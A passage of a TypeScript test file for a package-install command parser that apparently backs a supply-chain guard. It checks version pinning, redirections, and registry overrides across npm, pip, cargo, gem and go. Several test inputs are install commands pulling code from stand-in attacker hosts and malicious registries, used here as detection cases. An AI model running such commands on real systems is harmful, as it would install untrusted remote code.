import { describe, expect, it } from "vitest";
import { nonNull } from "../lib/non-null.js";
import type { PackageSpec } from "./package-install-parser.js";
import {
	isExactPinnedVersion,
	parseInstallCommands,
	pinnedVersionViolation,
	splitShellSegments,
	stripRedirections,
} from "./package-install-parser.js";

describe("stripRedirections", () => {
	it("drops `2>&1` FD-dup tokens", () => {
		expect(stripRedirections(["npm", "install", "pkg", "2>&1"])).toEqual([
			"npm",
			"install",
			"pkg",
		]);
	});

	it("drops `>` operator AND the following filename token", () => {
		expect(stripRedirections(["cmd", ">", "out.log"])).toEqual(["cmd"]);
	});

	it("drops `>>` operator AND the following filename token", () => {
		expect(stripRedirections(["cmd", ">>", "out.log"])).toEqual(["cmd"]);
	});

	it("drops `>file` operator+file embedded as one token", () => {
		expect(stripRedirections(["cmd", ">out.log"])).toEqual(["cmd"]);
	});

	it("drops `2>file` operator+FD+file embedded", () => {
		expect(stripRedirections(["cmd", "2>err.log"])).toEqual(["cmd"]);
	});

	it("drops `&>` and `&>>` (combined stdout+stderr)", () => {
		expect(stripRedirections(["cmd", "&>", "out"])).toEqual(["cmd"]);
		expect(stripRedirections(["cmd", "&>>", "out"])).toEqual(["cmd"]);
	});

	it("drops `<file` input redirection", () => {
		expect(stripRedirections(["cmd", "<input.txt"])).toEqual(["cmd"]);
	});

	it("drops `<<EOF` heredoc start (body handling is a separate concern)", () => {
		expect(stripRedirections(["cmd", "<<EOF"])).toEqual(["cmd"]);
	});

	it("preserves package specs with version constraints — `<3.0` glued to name", () => {
		// `pip install foo<3.0` tokenizes as `foo<3.0`; the token does NOT start
		// with a redirection operator, so it survives.
		expect(stripRedirections(["pip", "install", "foo<3.0"])).toEqual([
			"pip",
			"install",
			"foo<3.0",
		]);
	});

	it("is a no-op on commands with no redirections", () => {
		expect(stripRedirections(["npm", "install", "lodash"])).toEqual([
			"npm",
			"install",
			"lodash",
		]);
	});
});

describe("parseInstallCommands — regression: shell redirections (2026-05-28 #15)", () => {
	it("npm install with `2>&1` no longer treats it as a package", () => {
		const cmds = parseInstallCommands("npm install -g wrangler@latest 2>&1");
		expect(cmds).toHaveLength(1);
		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "wrangler", version: "latest" }]);
	});

	it("npm install with `> log` doesn't parse log as a package", () => {
		const cmds = parseInstallCommands("npm install lodash > install.log");
		expect(cmds).toHaveLength(1);
		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "lodash" }]);
	});

	it("npm install with `2>err.log` doesn't parse err.log as a package", () => {
		const cmds = parseInstallCommands("npm install lodash 2>err.log");
		expect(cmds).toHaveLength(1);
		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "lodash" }]);
	});

	it("compound command `npm install ... 2>&1 | tail` still parses the install correctly", () => {
		const cmds = parseInstallCommands("npm install lodash 2>&1 | tail -15");
		// tail isn't an install verb, so only the npm segment surfaces
		expect(cmds).toHaveLength(1);
		expect(nonNull(cmds[0]).packages).toEqual([{ kind: "registry", name: "lodash" }]);
	});
});

describe("splitShellSegments", () => {
	it("splits on ;, &&, ||, |, &", () => {
		expect(splitShellSegments("a; b && c || d | e & f")).toEqual([
			"a",
			"b",
			"c",
			"d",
			"e",
			"f",
		]);
	});

	it("respects quotes", () => {
		expect(splitShellSegments("npm install 'foo && bar' && pip install baz")).toEqual([
			"npm install 'foo && bar'",
			"pip install baz",
		]);
	});

	it("ignores empty segments", () => {
		expect(splitShellSegments(" ;; ")).toEqual([]);
	});
});

describe("parseInstallCommands — npm family", () => {
	it("npm install <pkg> → add, single registry package", () => {
		const cmd = nonNull(parseInstallCommands("npm install lodash")[0]);
		expect(cmd.ecosystem).toBe("npm");
		expect(cmd.manager).toBe("npm");
		expect(cmd.action).toBe("add");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "lodash" }]);
		expect(cmd.fromLockfile).toBe(false);
		expect(cmd.fromManifest).toBe(false);
	});

	it("npm install with no args → sync from manifest", () => {
		const cmd = nonNull(parseInstallCommands("npm install")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
		expect(cmd.packages).toEqual([]);
	});

	it("npm ci → sync from lockfile", () => {
		const cmd = nonNull(parseInstallCommands("npm ci")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("npm i shorthand", () => {
		const cmd = nonNull(parseInstallCommands("npm i react react-dom")[0]);
		expect(cmd.action).toBe("add");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : null))).toEqual([
			"react",
			"react-dom",
		]);
	});

	it("npm install with @version", () => {
		const cmd = nonNull(parseInstallCommands("npm install lodash@4.17.21")[0]);
		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "lodash", version: "4.17.21" });
	});

	it("npm install with scoped package", () => {
		const cmd = nonNull(parseInstallCommands("npm install @types/node@22.5.0")[0]);
		expect(nonNull(cmd.packages[0])).toEqual({
			kind: "registry",
			name: "@types/node",
			version: "22.5.0",
		});
	});

	it("npm install with bare scoped package (no version)", () => {
		const cmd = nonNull(parseInstallCommands("npm install @scope/lib")[0]);
		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "@scope/lib" });
	});

	it("npm install git URL → git_url spec", () => {
		const cmd = nonNull(parseInstallCommands(
			"npm install git+https://github.com/attacker/evil.git",
		)[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
	});

	it("npm install tarball URL → tarball_url spec", () => {
		const cmd = nonNull(parseInstallCommands(
			"npm install https://attacker.com/payload.tgz",
		)[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("tarball_url");
	});

	it("npm install local path → local_path spec", () => {
		const cmd = nonNull(parseInstallCommands("npm install ./my-local-pkg")[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("local_path");
	});

	it("npm install --registry attacker.com captures customRegistry", () => {
		const cmd = nonNull(parseInstallCommands(
			"npm install foo --registry http://attacker.com",
		)[0]);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("npm install --registry=URL form", () => {
		const cmd = nonNull(parseInstallCommands(
			"npm install foo --registry=http://attacker.com",
		)[0]);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("pnpm install --frozen-lockfile → fromLockfile", () => {
		const cmd = nonNull(parseInstallCommands("pnpm install --frozen-lockfile")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("yarn (no subcommand) → sync from manifest", () => {
		const cmd = nonNull(parseInstallCommands("yarn")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
	});

	it("yarn add foo → add", () => {
		const cmd = nonNull(parseInstallCommands("yarn add foo")[0]);
		expect(cmd.action).toBe("add");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "foo" }]);
	});

	it("bun add foo bar", () => {
		const cmd = nonNull(parseInstallCommands("bun add foo bar")[0]);
		expect(cmd.manager).toBe("bun");
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : null))).toEqual([
			"foo",
			"bar",
		]);
	});

	it("npm uninstall → remove (no packages added)", () => {
		const cmd = nonNull(parseInstallCommands("npm uninstall lodash")[0]);
		expect(cmd.action).toBe("remove");
	});
});

describe("parseInstallCommands — pip family", () => {
	it("pip install <pkg>", () => {
		const cmd = nonNull(parseInstallCommands("pip install requests")[0]);
		expect(cmd.ecosystem).toBe("pypi");
		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests" }]);
	});

	it("pip install with version specifier RETAINS the operator (finding: pin bypass)", () => {
		const cmd = nonNull(parseInstallCommands("pip install requests==22.32.5")[0]);
		expect(nonNull(cmd.packages[0])).toEqual({
			kind: "registry",
			name: "requests",
			version: "==22.32.5", // operator kept so the pin check can see `==` vs a range
		});
	});

	it("pip install -r requirements.txt → fromManifest with manifestFile", () => {
		const cmd = nonNull(parseInstallCommands("pip install -r requirements.txt")[0]);
		expect(cmd.fromManifest).toBe(true);
		expect(cmd.manifestFile).toBe("requirements.txt");
	});

	it("pip install --index-url URL captures customRegistry", () => {
		const cmd = nonNull(parseInstallCommands(
			"pip install foo --index-url http://attacker.com",
		)[0]);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("pip install with extras [foo,bar] strips them from name", () => {
		const cmd = nonNull(parseInstallCommands("pip install requests[security]")[0]);
		expect(nonNull(cmd.packages[0])).toMatchObject({ kind: "registry", name: "requests" });
	});

	it("pip install git+URL → git_url spec", () => {
		const cmd = nonNull(parseInstallCommands(
			"pip install git+https://github.com/attacker/evil",
		)[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
	});

	it("pip3 alias", () => {
		const cmd = nonNull(parseInstallCommands("pip3 install numpy")[0]);
		expect(cmd.manager).toBe("pip3");
		expect(cmd.ecosystem).toBe("pypi");
	});

	it("pipx install → install_global", () => {
		const cmd = nonNull(parseInstallCommands("pipx install poetry")[0]);
		expect(cmd.action).toBe("install_global");
	});

	// `pipx inject <venv> <pkgs…>` — the first positional is the EXISTING
	// environment, not a package (finding 2026-06: `pipx inject black
	// requests==2.31.0` treated `black` as an unpinned package and blocked).
	it("pipx inject skips the venv target — only the injected specs are packages", () => {
		const cmd = nonNull(parseInstallCommands("pipx inject black requests==2.31.0")[0]);
		expect(cmd.packages).toEqual([{ kind: "registry", name: "requests", version: "==2.31.0" }]);
	});

	it("pipx inject with several specs keeps them all (venv alone is dropped)", () => {
		const cmd = nonNull(parseInstallCommands("pipx inject black requests==2.31.0 urllib3==2.2.0")[0]);
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual([
			"requests",
			"urllib3",
		]);
	});

	it("pipx inject with flags before the venv still drops exactly the venv", () => {
		const cmd = nonNull(parseInstallCommands("pipx inject --include-apps black requests==2.31.0")[0]);
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
	});

	it("pipx inject with NO package specs yields no packages (nothing to gate)", () => {
		const cmd = nonNull(parseInstallCommands("pipx inject black")[0]);
		expect(cmd.packages).toEqual([]);
	});

	it("pipx INSTALL keeps its first positional as the package (only inject skips)", () => {
		const cmd = nonNull(parseInstallCommands("pipx install black")[0]);
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["black"]);
	});

	it("a malicious spec in the inject list is still classified (the guard still sees it)", () => {
		const cmd = nonNull(parseInstallCommands("pipx inject black git+https://github.com/attacker/evil")[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
	});
});

// ATTACHED short-option values (finding 2026-06, same class as git `-mfix`):
// optparse-style pip accepts the value glued to the flag. Each must surface the
// same guard signal as the separated form — previously they parsed as unknown
// flags and the signal was silently lost.
describe("pip attached short-option values", () => {
	it("`-rreqs.txt` is a manifest install, same as `-r reqs.txt`", () => {
		const cmd = nonNull(parseInstallCommands("pip install -rrequirements.txt")[0]);
		expect(cmd.manifestFile).toBe("requirements.txt");
		expect(cmd.fromManifest).toBe(true);
	});

	it("`-rhttps://…` (remote requirements) is captured, not silently skipped", () => {
		const cmd = nonNull(parseInstallCommands("pip install -rhttps://evil.example/r.txt")[0]);
		expect(cmd.manifestFile).toBe("https://evil.example/r.txt");
	});

	it("`-ihttps://mirror` is a custom registry, same as `-i https://mirror`", () => {
		const cmd = nonNull(parseInstallCommands("pip install -ihttps://mirror.example/simple requests==2.31.0")[0]);
		expect(cmd.customRegistry).toBe("https://mirror.example/simple");
	});

	it("`-egit+URL` is an editable git spec the guard classifies, same as `-e git+URL`", () => {
		const cmd = nonNull(parseInstallCommands("pip install -egit+https://github.com/attacker/evil")[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
	});

	it("`-cconstraints.txt` marks constraints without inventing a package", () => {
		const cmd = nonNull(parseInstallCommands("pip install -cconstraints.txt requests==2.31.0")[0]);
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
	});

	it("separated forms are unchanged (`-r reqs.txt`, `-i URL`, `-e spec`)", () => {
		const withR = nonNull(parseInstallCommands("pip install -r requirements.txt")[0]);
		expect(withR.manifestFile).toBe("requirements.txt");
		const withI = nonNull(parseInstallCommands("pip install -i https://mirror.example/simple requests==2.31.0")[0]);
		expect(withI.customRegistry).toBe("https://mirror.example/simple");
		const withE = nonNull(parseInstallCommands("pip install -e git+https://github.com/attacker/evil")[0]);
		expect(nonNull(withE.packages[0]).kind).toBe("git_url");
	});

	it("unrelated short flags with attached text are not misread as r/i/c/e values", () => {
		// `-q`-style flags carry no value; a flag like `-U` (upgrade) must not match.
		const cmd = nonNull(parseInstallCommands("pip install -U requests==2.31.0")[0]);
		expect(cmd.packages.map((p) => (p.kind === "registry" ? p.name : p.kind))).toEqual(["requests"]);
		expect(cmd.manifestFile).toBeUndefined();
	});
});

// ROUND-TRIP PIN CONTRACT (finding: PyPI operators lost during parsing). raw
// requirement → parsed spec → pin decision must retain every token that affects
// the decision. Only `==`/`===` are exact pins; `~=`/`>=`/`<=`/`>`/`<`/`!=` and a
// bare name are NOT — they previously slipped through as exact `2.31.0`.
describe("pip exact-pin round-trip (parse → pinnedVersionViolation)", () => {
	function isExactPin(spec: string): boolean {
		const cmd = nonNull(parseInstallCommands(`pip install ${spec}`)[0]);
		return pinnedVersionViolation(nonNull(cmd.packages[0]), "pypi") === null;
	}

	it.each([
		["requests==2.31.0", true],
		["requests===2.31.0", true],
		["requests~=2.31.0", false],
		["requests>=2.31.0", false],
		["requests<=2.31.0", false],
		["requests>2.31.0", false],
		["requests!=2.31.0", false],
		["requests", false],
	])("%s → exact pin = %s", (spec, expected) => {
		expect(isExactPin(spec)).toBe(expected);
	});
});

describe("parseInstallCommands — poetry / uv", () => {
	it("poetry add foo", () => {
		const cmd = nonNull(parseInstallCommands("poetry add fastapi")[0]);
		expect(cmd.ecosystem).toBe("pypi");
		expect(cmd.action).toBe("add");
	});

	it("poetry install → sync from manifest", () => {
		const cmd = nonNull(parseInstallCommands("poetry install")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
	});

	it("poetry install --no-update → fromLockfile", () => {
		const cmd = nonNull(parseInstallCommands("poetry install --no-update")[0]);
		expect(cmd.fromLockfile).toBe(true);
	});

	it("uv add foo", () => {
		const cmd = nonNull(parseInstallCommands("uv add httpx")[0]);
		expect(cmd.manager).toBe("uv");
		expect(cmd.action).toBe("add");
	});

	it("uv sync --frozen → sync from lockfile", () => {
		const cmd = nonNull(parseInstallCommands("uv sync --frozen")[0]);
		expect(cmd.fromLockfile).toBe(true);
	});

	it("uv pip install foo delegates to pip parser", () => {
		const cmd = nonNull(parseInstallCommands("uv pip install requests")[0]);
		expect(cmd.ecosystem).toBe("pypi");
		expect(cmd.action).toBe("add");
	});

	it("uv tool install → install_global", () => {
		const cmd = nonNull(parseInstallCommands("uv tool install black")[0]);
		expect(cmd.action).toBe("install_global");
	});
});

describe("parseInstallCommands — cargo", () => {
	it("cargo add foo", () => {
		const cmd = nonNull(parseInstallCommands("cargo add serde")[0]);
		expect(cmd.ecosystem).toBe("cargo");
		expect(cmd.action).toBe("add");
	});

	it("cargo install foo → install_global", () => {
		const cmd = nonNull(parseInstallCommands("cargo install ripgrep")[0]);
		expect(cmd.action).toBe("install_global");
	});

	it("cargo build --locked → fromLockfile sync", () => {
		const cmd = nonNull(parseInstallCommands("cargo build --locked")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromLockfile).toBe(true);
	});

	it("cargo add --git URL captures git URL", () => {
		const cmd = nonNull(parseInstallCommands(
			"cargo add --git https://github.com/foo/bar foo",
		)[0]);
		expect(cmd.packages.some((p) => p.kind === "git_url")).toBe(true);
	});
});

describe("parseInstallCommands — gem / bundle", () => {
	it("gem install foo → install_global", () => {
		const cmd = nonNull(parseInstallCommands("gem install rails")[0]);
		expect(cmd.ecosystem).toBe("rubygems");
		expect(cmd.action).toBe("install_global");
	});

	it("bundle install → sync from manifest", () => {
		const cmd = nonNull(parseInstallCommands("bundle install")[0]);
		expect(cmd.action).toBe("sync");
		expect(cmd.fromManifest).toBe(true);
	});

	it("bundle install --frozen → fromLockfile", () => {
		const cmd = nonNull(parseInstallCommands("bundle install --frozen")[0]);
		expect(cmd.fromLockfile).toBe(true);
	});

	it("bundle add foo → add", () => {
		const cmd = nonNull(parseInstallCommands("bundle add rails")[0]);
		expect(cmd.action).toBe("add");
	});
});

describe("parseInstallCommands — go", () => {
	it("go get module → add", () => {
		const cmd = nonNull(parseInstallCommands("go get github.com/gin-gonic/gin")[0]);
		expect(cmd.ecosystem).toBe("go");
		expect(cmd.action).toBe("add");
		expect(nonNull(cmd.packages[0])).toEqual({
			kind: "registry",
			name: "github.com/gin-gonic/gin",
		});
	});

	it("go install → install_global", () => {
		const cmd = nonNull(parseInstallCommands(
			"go install github.com/spf13/cobra-cli@latest",
		)[0]);
		expect(cmd.action).toBe("install_global");
		expect(nonNull(cmd.packages[0])).toEqual({
			kind: "registry",
			name: "github.com/spf13/cobra-cli",
			version: "latest",
		});
	});
});

describe("parseInstallCommands — env-var registry overrides (P1.1)", () => {
	it("`NPM_CONFIG_REGISTRY=URL npm install foo` captures customRegistry", () => {
		const cmd = nonNull(parseInstallCommands(
			"NPM_CONFIG_REGISTRY=http://attacker.com npm install lodash",
		)[0]);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("lowercase npm_config_registry is also detected (npm reads both)", () => {
		const cmd = nonNull(parseInstallCommands(
			"npm_config_registry=http://evil npm install foo",
		)[0]);
		expect(cmd.customRegistry).toBe("http://evil");
	});

	it("`PIP_INDEX_URL=URL pip install requests` captures customRegistry", () => {
		const cmd = nonNull(parseInstallCommands(
			"PIP_INDEX_URL=http://attacker.com pip install requests",
		)[0]);
		expect(cmd.customRegistry).toBe("http://attacker.com");
	});

	it("`env NPM_CONFIG_REGISTRY=URL npm install` form", () => {
		const cmd = nonNull(parseInstallCommands(
			"env NPM_CONFIG_REGISTRY=http://evil npm install foo",
		)[0]);
		expect(cmd.customRegistry).toBe("http://evil");
	});

	it("YARN_REGISTRY=URL yarn add foo", () => {
		const cmd = nonNull(parseInstallCommands("YARN_REGISTRY=http://x yarn add foo")[0]);
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("BUN_CONFIG_REGISTRY=URL bun add foo", () => {
		const cmd = nonNull(parseInstallCommands(
			"BUN_CONFIG_REGISTRY=http://x bun add foo",
		)[0]);
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("UV_INDEX_URL=URL uv pip install foo", () => {
		const cmd = nonNull(parseInstallCommands("UV_INDEX_URL=http://x uv pip install foo")[0]);
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("CARGO_REGISTRIES_FOO_INDEX=URL cargo add bar", () => {
		const cmd = nonNull(parseInstallCommands(
			"CARGO_REGISTRIES_EVIL_INDEX=http://x cargo add bar",
		)[0]);
		expect(cmd.customRegistry).toBe("http://x");
	});

	it("Non-registry env var (DEBUG=1) does not set customRegistry", () => {
		const cmd = nonNull(parseInstallCommands("DEBUG=1 npm install lodash")[0]);
		expect(cmd.customRegistry).toBeUndefined();
	});

	it("Inline flag still wins over env var if both are present", () => {
		const cmd = nonNull(parseInstallCommands(
			"NPM_CONFIG_REGISTRY=http://env npm install foo --registry http://cli",
		)[0]);
		expect(cmd.customRegistry).toBe("http://cli");
	});
});

describe("parseInstallCommands — pre-verb flags (P1.2)", () => {
	it("`npm --prefix app install evil` parses install verb correctly", () => {
		const cmd = nonNull(parseInstallCommands("npm --prefix app install evil")[0]);
		expect(cmd).toBeDefined();
		expect(cmd.action).toBe("add");
		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "evil" });
	});

	it("`pnpm --filter app add evil`", () => {
		const cmd = nonNull(parseInstallCommands("pnpm --filter app add evil")[0]);
		expect(cmd.action).toBe("add");
		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "evil" });
	});

	it("`yarn workspace app add evil`", () => {
		const cmd = nonNull(parseInstallCommands("yarn workspace app add evil")[0]);
		expect(cmd.action).toBe("add");
		expect(nonNull(cmd.packages[0])).toEqual({ kind: "registry", name: "evil" });
	});

	it("`yarn workspaces foreach run build` is not an install", () => {
		expect(parseInstallCommands("yarn workspaces foreach run build")).toEqual([]);
	});
});

describe("parseInstallCommands — pip editable (P1.3)", () => {
	it("`pip install -e git+URL` keeps the git URL as the spec", () => {
		const cmd = nonNull(parseInstallCommands(
			"pip install -e git+https://attacker.com/evil",
		)[0]);
		expect(cmd.packages).toHaveLength(1);
		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
	});

	it("`pip install --editable git+URL` keeps the git URL", () => {
		const cmd = nonNull(parseInstallCommands(
			"pip install --editable git+https://attacker.com/evil",
		)[0]);
		expect(cmd.packages).toHaveLength(1);
		expect(nonNull(cmd.packages[0]).kind).toBe("git_url");
	});

	it("`pip install -e ./local` keeps local path", () => {
		const cmd = nonNull(parseInstallCommands("pip install -e ./local")[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("local_path");
	});

	it("`pip install -e .` (current dir, common editable form)", () => {
		const cmd = nonNull(parseInstallCommands("pip install -e .")[0]);
		expect(nonNull(cmd.packages[0]).kind).toBe("local_path");
	});
});

describe("parseInstallCommands — effective cwd (P1.4)", () => {
	it("standalone install has no effectiveCwd shift", () => {
		const cmd = nonNull(parseInstallCommands("npm install foo")[0]);
		expect(cmd.effectiveCwd).toBeUndefined();
	});

	it("`cd packages/app && npm ci` attaches packages/app as effectiveCwd", () => {
		const cmds = parseInstallCommands("cd packages/app && npm ci");
		expect(cmds).toHaveLength(1);
		expect(nonNull(cmds[0]).effectiveCwd).toBe("packages/app");
	});

	it("two cd hops compose", () => {
		const cmds = parseInstallCommands("cd packages && cd app && npm ci");
		expect(cmds).toHaveLength(1);
		expect(nonNull(cmds[0]).effectiveCwd).toBe("packages/app");
	});

	it("each install sees its own cwd", () => {
		const cmds = parseInstallCommands(
			"cd a && npm ci && cd ../b && npm ci",
		);
		expect(cmds).toHaveLength(2);
		expect(nonNull(cmds[0]).effectiveCwd).toBe("a");
		expect(nonNull(cmds[1]).effectiveCwd).toBe("a/../b");
	});

	it("absolute cd resets to that absolute path", () => {
		const cmds = parseInstallCommands("cd /abs/foo && npm install bar");
		expect(nonNull(cmds[0]).effectiveCwd).toBe("/abs/foo");
	});
});

describe("parseInstallCommands — compound and noise", () => {
	it("non-install command returns []", () => {
		expect(parseInstallCommands("ls -la")).toEqual([]);
		expect(parseInstallCommands("npm run test")).toEqual([]);
		expect(parseInstallCommands("npm test")).toEqual([]);
		expect(parseInstallCommands("npm version patch")).toEqual([]);
	});

	it("compound command returns each segment", () => {
		const cmds = parseInstallCommands("cd app && npm install lodash && pip install requests");
		expect(cmds).toHaveLength(2);
		expect(nonNull(cmds[0]).manager).toBe("npm");
		expect(nonNull(cmds[1]).manager).toBe("pip");
	});

	it("sudo / env prefix is stripped", () => {
		const cmd = nonNull(parseInstallCommands("sudo npm install -g typescript")[0]);
		expect(cmd.manager).toBe("npm");
		expect(cmd.action).toBe("add");
	});

	it("DEBUG=1 env prefix stripped", () => {
		const cmd = nonNull(parseInstallCommands("DEBUG=1 pip install requests")[0]);
		expect(cmd.manager).toBe("pip");
	});

	it("empty / blank → []", () => {
		expect(parseInstallCommands("")).toEqual([]);
		expect(parseInstallCommands("   ")).toEqual([]);
	});
});

// The exact-pin gate only works if each ecosystem parser lands the pinned
// version in spec.version (not as a phantom positional). These cover the
// separate-flag pin forms that previously dropped the version on the floor.
describe("parseInstallCommands — version pins land in spec.version", () => {
	it("cargo add crate@1.0.0 → version on the spec (not a 2nd crate)", () => {
		const cmd = nonNull(parseInstallCommands("cargo add serde@1.0.0")[0]);
		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
	});

	it("cargo add --vers 1.0.0 → version captured, no phantom package", () => {
		const cmd = nonNull(parseInstallCommands("cargo add serde --vers 1.0.0")[0]);
		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
	});

	it("cargo add --version=1.0.0 (glued flag) → version captured", () => {
		const cmd = nonNull(parseInstallCommands("cargo add serde --version=1.0.0")[0]);
		expect(cmd.packages).toEqual([{ kind: "registry", name: "serde", version: "1.0.0" }]);
	});

	it("cargo install ripgrep@13.0.0 → version captured", () => {
		const cmd = nonNull(parseInstallCommands("cargo install ripgrep@13.0.0")[0]);
		expect(cmd.packages).toEqual([
			{ kind: "registry", name: "ripgrep", version: "13.0.0" },
		]);
	});

	it("gem install x -v 1.2.3 → version captured, no phantom package", () => {
		const cmd = nonNull(parseInstallCommands("gem install rails -v 7.1.0")[0]);
		expect(cmd.packages).toEqual([{ kind: "registry", name: "rails", version: "7.1.0" }]);
	});

	it("gem install x --version 1.2.3 → version captured", () => {
		const cmd = nonNull(parseInstallCommands("gem install rails --version 7.1.0")[0]);
		expect(cmd.packages).toEqual([{ kind: "registry", name: "rails", version: "7.1.0" }]);
	});

});

describe("pinnedVersionViolation — per-ecosystem unit cases", () => {
	const reg = (name: string, version?: string): PackageSpec =>
		version === undefined
			? { kind: "registry", name }
			: { kind: "registry", name, version };

	it("BLOCKS an absent version (npm `lodash` bare)", () => {
		expect(pinnedVersionViolation(reg("lodash"), "npm")).not.toBeNull();
	});

	it("BLOCKS a caret range (npm `lodash@^4`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "^4"), "npm")).not.toBeNull();
	});

	it("BLOCKS a dist-tag (npm `lodash@latest`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "latest"), "npm")).not.toBeNull();
	});

	it("BLOCKS major-only and major.minor-only (npm `@4`, `@4.17`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "4"), "npm")).not.toBeNull();
		expect(pinnedVersionViolation(reg("lodash", "4.17"), "npm")).not.toBeNull();
	});

	it("BLOCKS pip range operators (the parser RETAINS them, so a range never masquerades as a pin)", () => {
		// classifyPipSpec keeps the comparison operator, so `requests>=2` reaches
		// the pin check as ">=2" — a range, blocked. A BARE "2" is different:
		// under PEP 440, `==2` is EXACT (it matches only release 2, never 2.1),
		// so it is allowed — see the ecosystem-rules cases below (finding 2026-06).
		expect(pinnedVersionViolation(reg("requests", ">=2"), "pypi")).not.toBeNull();
		expect(pinnedVersionViolation(reg("requests", "~=2.31"), "pypi")).not.toBeNull();
		expect(pinnedVersionViolation(reg("requests", "!=2.31.0"), "pypi")).not.toBeNull();
	});

	// Ecosystem-aware exact-pin rules (finding 2026-06): one universal
	// major.minor.patch regex falsely blocked valid exact pins in ecosystems
	// whose version grammar is not three-component semver.
	it("ALLOWS PEP 440 exact pins that are not three-component (`==24.2`, post/rc/dev/local)", () => {
		expect(pinnedVersionViolation(reg("packaging", "==24.2"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("packaging", "==24"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==1.0.post1"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==2.0.0rc1"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==1.2.3.dev4"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "==1.2+local.7"), "pypi")).toBeNull();
		expect(pinnedVersionViolation(reg("x", "===1.0"), "pypi")).toBeNull(); // arbitrary equality
	});

	it("still BLOCKS PyPI floating forms (`==24.*` prefix match, dist-tags)", () => {
		expect(pinnedVersionViolation(reg("packaging", "==24.*"), "pypi")).not.toBeNull();
		expect(pinnedVersionViolation(reg("packaging", "latest"), "pypi")).not.toBeNull();
	});

	it("ALLOWS a RubyGems exact two-component version (`'7.1'` is exact to Gem::Version)", () => {
		expect(pinnedVersionViolation(reg("rails", "7.1"), "rubygems")).toBeNull();
		expect(pinnedVersionViolation(reg("rails", "7.1.0.rc1"), "rubygems")).toBeNull();
	});

	it("keeps npm/cargo/go partials BLOCKED (they really do float in those ecosystems)", () => {
		expect(pinnedVersionViolation(reg("lodash", "4.17"), "npm")).not.toBeNull();
		expect(pinnedVersionViolation(reg("serde", "=1.2"), "cargo")).not.toBeNull();
		expect(pinnedVersionViolation(reg("x", "v1.2"), "go")).not.toBeNull();
	});

	it("BLOCKS a go dist-tag (`x@latest`)", () => {
		expect(pinnedVersionViolation(reg("x", "latest"), "go")).not.toBeNull();
	});

	it("ALLOWS a full npm version (`lodash@4.17.21`)", () => {
		expect(pinnedVersionViolation(reg("lodash", "4.17.21"), "npm")).toBeNull();
	});

	it("ALLOWS a pip `==` exact (`requests==2.31.0` → version `2.31.0`)", () => {
		expect(pinnedVersionViolation(reg("requests", "2.31.0"), "pypi")).toBeNull();
	});

	it("ALLOWS a go `v`-prefixed tag and pseudo-version", () => {
		expect(pinnedVersionViolation(reg("x", "v1.2.3"), "go")).toBeNull();
		expect(
			pinnedVersionViolation(reg("x", "v0.0.0-20191109021931-daa7c04131f5"), "go"),
		).toBeNull();
	});

	it("ALLOWS a cargo bare and `=`-prefixed exact (`1.0.0`, `=1.0.0`)", () => {
		expect(pinnedVersionViolation(reg("serde", "1.0.0"), "cargo")).toBeNull();
		expect(pinnedVersionViolation(reg("serde", "=1.0.0"), "cargo")).toBeNull();
	});

	it("ALLOWS a gem exact (`rails` at `7.1.0`)", () => {
		expect(pinnedVersionViolation(reg("rails", "7.1.0"), "rubygems")).toBeNull();
	});

	it("returns null for non-registry specs (git/tarball/local)", () => {
		expect(pinnedVersionViolation({ kind: "git_url", url: "x" }, "npm")).toBeNull();
		expect(
			pinnedVersionViolation({ kind: "tarball_url", url: "x.tgz" }, "npm"),
		).toBeNull();
